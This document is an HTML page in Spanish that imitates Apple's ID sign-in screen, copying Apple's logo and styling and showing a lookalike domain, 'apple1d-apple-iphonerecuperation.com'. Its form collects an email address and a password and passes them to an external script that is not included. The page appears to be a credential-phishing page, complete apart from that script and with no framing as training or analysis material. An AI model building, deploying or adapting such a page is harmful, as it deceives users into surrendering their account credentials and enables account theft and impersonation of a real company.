<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple ID - Iniciar sesión</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { width: 100%; max-width: 400px; padding: 20px; }
        .apple-logo { text-align: center; margin-bottom: 30px; }
        .apple-logo svg { width: 50px; height: 50px; fill: #1d1d1f; }
        .login-card { background: white; border-radius: 18px; padding: 40px 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); }
        h1 { font-size: 24px; color: #1d1d1f; text-align: center; margin-bottom: 10px; }
        .subtitle { text-align: center; color: #86868b; font-size: 14px; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; font-size: 14px; color: #1d1d1f; margin-bottom: 6px; }
        input { width: 100%; padding: 12px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 16px; }
        input:focus { outline: none; border-color: #0071e3; }
        .signin-btn { width: 100%; padding: 14px; background: #0071e3; color: white; border: none; border-radius: 8px; font-size: 17px; font-weight: 600; cursor: pointer; }
        .signin-btn:hover { background: #0077ed; }
        .apple-links { text-align: center; margin-top: 25px; }
        .create-link { color: #0071e3; text-decoration: none; font-size: 14px; }
        .footer { text-align: center; margin-top: 30px; color: #86868b; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="apple-logo">
            <svg viewBox="0 0 24 24">
                <path d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.4-2.79-2.9-2.4-7.36.86-7.59 1.22.03 2.09.68 2.83.68.74 0 1.9-.82 3.2-.7 1.02.04 1.96.45 2.6 1.14-2.47 1.49-2.08 4.73.45 5.87-.36.89-.78 1.77-1.56 2.6zM14.96 5.19c-1.12.07-2.44.72-3.2 1.66-.68.84-1.1 1.99-.92 3.18 1.1.06 2.24-.6 2.94-1.56.7-.96 1.06-2.08 1.18-3.28z"/>
            </svg>
        </div>

        <div class="login-card">
            <h1>Iniciar sesión</h1>
            <p class="subtitle">apple1d-apple-iphonerecuperation.com</p>

            <form id="loginForm">
                <div class="form-group">
                    <label for="email">Correo electrónico</label>
                    <input type="email" id="email" name="email" placeholder="ejemplo@icloud.com" required>
                </div>

                <div class="form-group">
                    <label for="password">Contraseña</label>
                    <input type="password" id="password" name="password" placeholder="Contraseña" required>
                </div>

                <button type="submit" class="signin-btn">Iniciar sesión</button>
            </form>

            <div class="apple-links">
                <a href="#" class="create-link">¿No tienes un Apple ID? Crea uno.</a>
            </div>
        </div>
        
        <div class="footer">
            apple1d-apple-iphonerecuperation.com
        </div>
    </div>

    <script src="js/script.js"></script>
</body>
</html>
